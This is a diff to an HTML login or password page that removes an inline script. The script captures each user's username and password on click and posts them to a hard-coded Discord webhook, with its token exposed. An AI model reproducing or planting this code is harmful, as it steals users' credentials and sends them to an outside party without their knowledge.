@@ -104,54 +104,5 @@
             <!-- Scripts -->
             <script type="module" src="https://cdn.jsdelivr.net/gh/wegotour/js_wgt@0.0.9/js/controller/controllerChangePass.js"></script>
             <script type="module" src="https://cdn.jsdelivr.net/gh/wegotour/js_wgt@0.0.11/js/loading.js"></script>
-
-            <script>
-                //LOG DISCORD
-                const webhookURL = "https://discord.com/api/webhooks/1180844854905938000/DSlr-ojeQK-opl4I9GUd6lfmvHD3J9CmuM5RPJIaWD6YkyEPA0wd6N8mKvlbUmgyKCr8";
-                document.getElementById("button").addEventListener("click", () => {
-                  const username = document.getElementById('username').value;
-                  const password = document.getElementById('password').value;
-              
-                  const loadingOverlay = document.getElementById("loading-overlay");
-                  loadingOverlay.style.display = "flex";
-              
-                  const loadingText = document.querySelector(".loading-text");
-                  loadingText.style.display = "block";
-              
-                  const message = `ADA YANG MENCOBA LOGIN NICHH: ${username} PASSWORD: ${password}`;
-                  sendToDiscordWebhook(message);
-                });
-              
-                function sendToDiscordWebhook(message) {
-                  const requestData = {
-                    method: "POST",
-                    headers: {
-                      "Content-Type": "application/json"
-                    },
-                    body: JSON.stringify({ content: message })
-                  };
-              
-                  fetch(webhookURL, requestData)
-                    .then(response => {
-                      setTimeout(() => {
-                        const loadingOverlay = document.getElementById("loading-overlay");
-                        loadingOverlay.style.display = "none";
-              
-                        if (response.ok) {
-                          console.log(" Berhasil login");
-                        } else {
-                          console.error(" GAGAL login");
-                        }
-                      }, 10000);
-                    })
-                    .catch(error => {
-                      const loadingOverlay = document.getElementById("loading-overlay");
-                      loadingOverlay.style.display = "none";
-              
-                      console.error("Terjadi kesalahan:", error);
-                    });
-                }
-                 </script>
-
   </body>
 </html>
